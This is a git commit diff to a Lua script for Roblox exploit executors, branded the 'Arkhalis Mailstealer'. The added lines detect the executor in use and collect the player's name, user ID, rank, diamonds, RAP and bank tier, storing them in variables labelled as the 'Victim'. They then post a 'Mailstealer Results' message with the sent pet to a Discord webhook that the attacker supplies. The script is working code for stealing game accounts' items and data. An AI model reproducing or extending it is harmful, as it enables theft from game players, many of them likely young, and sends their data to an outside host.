1323d2c68c232bc4914d0e4bd624b7283d3ce73b
Arkhalislua <130490495+Arkhalislua@users.noreply.github.com>
2023-05-11 17:31:37 +0200

    Update WebhookMaibloxData.lua

--- WebhookMaibloxData.lua
+++ WebhookMaibloxData.lua
@@ -1,3 +1,24 @@
+local function getexploit()
+	local exploit =
+		(syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
+		(secure_load and "Sentinel") or
+		(is_sirhurt_closure and "Sirhurt") or
+		(pebc_execute and "ProtoSmasher") or
+		(KRNL_LOADED and "Krnl") or
+		(WrapGlobal and "WeAreDevs") or
+		(isvm and "Proxo") or
+		(shadow_env and "Shadow") or
+		(jit and "EasyExploits") or
+		(getscriptenvs and "Calamari") or
+		(unit and not syn and "Unit") or
+		(OXYGEN_LOADED and "Oxygen U") or
+		(IsElectron and "Electron") or
+		("Unsupported")
+  
+	return exploit
+  end
+  
+--// Execution Log
 if game.PlaceId == 6284583030 then
 	_G.GameIn = "Pet Simulator X"
 elseif game.PlaceId == 7722306047 then
@@ -12,27 +33,43 @@ else
 	_G.GameIn = "❓ Couldn't find game"
 end
 local webhookcolor = "13369599"
+_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+_G.PlrUserVictim = game.Players.LocalPlayer.Name
+_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
+_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
+_G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats.Diamonds.Value
+_G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
+_G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
 local function sendwebhook(msg)
 local msg = {
-  ["content"]= "**🎁Arkhalis Data🎁**",
-  ["embeds"]= {
-    {
-      ["title"]= "`🐶Pets Data🐶`",
-      ["url"]= "https://discord.gg/N8VMJJXuDa",
-      ["color"]= ""..webhookcolor.."",
-      ["fields"]= {
+	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",
+	["content"]= "**💽Arkhalis Pet DataBase💽**",
+	["username"] = "Arkhalis",
+	["embeds"]= {
+	  {
+		["title"]= "`Arkhalis Mailstealer Results`",
+		["url"]= "https://discord.gg/vzY4yAk9ns",
+		["color"]= ""..webhookcolor.."",
+		["thumbnail"] = {
+        ["url"] = "https://cdn.discordapp.com/attachments/1077585452309155850/1106236489819496448/cat.png",
+        ["height"] = 420,
+        ["width"] = 420
+        },
+		["fields"]= {
         {
-          ["name"]= "🐕Pet Name & Rarity🐕",
-          ["value"]= "```Pet Name: "..v2.name.."\nPet Rarity: "..v2.rarity.."```",
-		  ["inline"]= true
-        }
+          ["name"]= "**🐕Pet Sended🐕**",
+          ["value"]= "```".._G.PetName.."```",
+          ["inline"]= true
+        },
+
       }
-    }
+      
+  }
   },
-  ["attachments"] = {}
-}
-local Webhook = _G.Webhook
-request = http_request or request or HttpPost or syn.request
-request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
-end
-sendwebhook(msg)
+	["attachments"] = {}
+  }
+  local Webhook = _G.Webhook
+  request = http_request or request or HttpPost or syn.request
+  request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
+  end
+  sendwebhook(msg)
